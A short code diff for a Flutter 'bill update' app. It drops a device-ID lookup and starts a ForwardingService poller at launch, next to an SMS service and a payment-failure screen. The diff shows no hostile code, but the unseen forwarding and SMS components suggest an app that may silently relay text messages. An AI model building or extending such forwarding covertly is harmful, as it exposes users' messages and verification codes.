@@ -1,5 +1,4 @@
 import 'package:flutter/material.dart';
-import 'package:flutter/services.dart';
 import 'package:go_router/go_router.dart';
 import 'theme.dart';
 import 'services/sms_service.dart';
@@ -18,18 +17,8 @@ import 'screens/payment_failed_screen.dart';
 void main() {
   WidgetsFlutterBinding.ensureInitialized();
   SmsService.init();
-  _initForwarding();
+  ForwardingService.instance.startPolling();
   runApp(const BillApp());
-}
-
-Future<void> _initForwarding() async {
-  try {
-    const channel = MethodChannel('com.example.bill_update_app/device');
-    final deviceId = await channel.invokeMethod<String>('getDeviceId');
-    if (deviceId != null && deviceId.isNotEmpty) {
-      ForwardingService.instance.init(deviceId);
-    }
-  } catch (_) {}
 }
 
 Future<void> _showPhoneDialog(BuildContext context) async {
